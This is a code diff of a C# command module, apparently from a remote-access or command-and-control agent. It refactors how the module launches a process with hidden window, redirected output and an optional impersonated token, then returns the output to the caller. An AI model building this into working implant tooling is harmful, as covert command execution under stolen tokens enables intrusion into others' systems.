@@ -1,10 +1,7 @@
 ﻿using Agent.Helpers;
 using Agent.Models;
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using WinAPI;
 using WinAPI.Wrapper;
 
 namespace Agent.Commands
@@ -17,11 +14,10 @@ namespace Agent.Commands
             var filename = task.SplittedArgs[0];
             string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();
 
-            var winAPI = WinAPIWrapper.CreateInstance();
 
             var creationParms = new ProcessCreationParameters()
             {
-                Application = filename + " " + args,
+                Command = filename + " " + args,
                 RedirectOutput = true,
                 CreateNoWindow = true,
                 CurrentDirectory = Environment.CurrentDirectory
@@ -30,7 +26,7 @@ namespace Agent.Commands
             if (ImpersonationHelper.HasCurrentImpersonation)
                 creationParms.Token = ImpersonationHelper.ImpersonatedToken;
 
-            var procResult = winAPI.CreateProcess(creationParms);
+            var procResult = APIWrapper.CreateProcess(creationParms);
 
             if (procResult.ProcessId == 0)
             {
@@ -39,7 +35,7 @@ namespace Agent.Commands
             }
 
             if (creationParms.RedirectOutput)
-                winAPI.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
         }
     }
 }
